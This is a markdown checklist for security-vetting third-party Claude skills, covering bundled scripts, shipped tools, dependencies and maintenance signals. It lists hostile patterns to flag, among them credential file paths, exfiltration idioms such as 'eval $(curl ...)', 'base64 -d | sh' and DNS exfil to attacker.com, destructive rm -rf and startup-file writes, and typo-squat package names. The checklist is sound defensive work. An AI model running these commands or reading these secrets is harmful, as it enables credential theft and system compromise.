# Vetting read checklist - priorities 2-5: scripts, tools, deps, history

Continues from [`workflow-vetting-checklist.md`](workflow-vetting-checklist.md) (priority 1: prompt injection). Same priority ordering.

**2. Executable scripts the skill bundles** (`scripts/`, `install.sh`, `setup.py`, `package.json` postinstall, Makefiles, pre-commit configs)

- Read end to end. Small scripts are normal; hundreds of lines of shell is itself a yellow flag.
- Credential access: reads of `~/.ssh/**`, `~/.aws/credentials`, `~/.aws/config`, `~/.config/gcloud/**`, `~/Library/Keychains/**` (Mac), `~/.netrc`, any `.env*` in `$HOME`, Windows Credential Manager, `git config --global` for credentials, browser cookie stores, SSM (`aws ssm get-parameter(s)` for paths the skill has no reason to touch).
- Exfil patterns: HTTP POST/PUT with local file contents to domains unrelated to the skill's purpose; `base64 -d | sh`; `eval $(curl ...)`; DNS exfil (`dig some-data.attacker.com`); piping to `nc`.
- Destructive ops outside the skill's workdir: `rm -rf` on `$HOME` or paths escaping the skill dir; overwrites of shell profiles (`.zshrc`, `.bashrc`, `.profile`, `.bash_profile`); writes to `~/Library/LaunchAgents/` (Mac), `~/.config/systemd/user/` (Linux), Windows startup folders, `/etc/`, cron tables; `git config --global`; modifications to `~/.claude/` beyond the skill's own dir.
- Supply chain: `curl https://... | sh`, `bash <(curl ...)` to any host - can't verify what lands. Binaries from GitHub releases without checksums. `npm i -g` / `pip install --user` of obscure packages.

**3. Tools the skill ships (Python scripts, Node modules, etc. that Claude would run on the user's behalf)**

- Network calls should go to the API the skill claims to wrap. A "Postmark skill" POSTing to `api.postmarkapp.com` is fine; one also POSTing to `pm-mirror.example.org` is not.
- Watch for skills reading files they weren't asked about - e.g., an "image optimization" skill that also globs `~/Documents/**/*.pdf`.

**4. Dependencies**

- `requirements.txt`, `package.json`, `pyproject.toml`, `Gemfile` - skim. Well-known packages (`requests`, `httpx`, `click`, `pydantic`) fine. Obscure names, typo-squats (`reqests`, `urllib-3`, `python-dateutils`), or packages whose names don't match the skill's purpose are flags.
- Pinned versions > ranges. Unpinned `latest` is a supply-chain vector.

**5. Version control signals**

- Most recent commit years ago, skill unmaintained? Yellow flag - mention to the user.
- Does the author have other skills on skillsmp or a plausible GitHub profile? A single-skill throwaway account with no history is weaker than an org that publishes regularly.
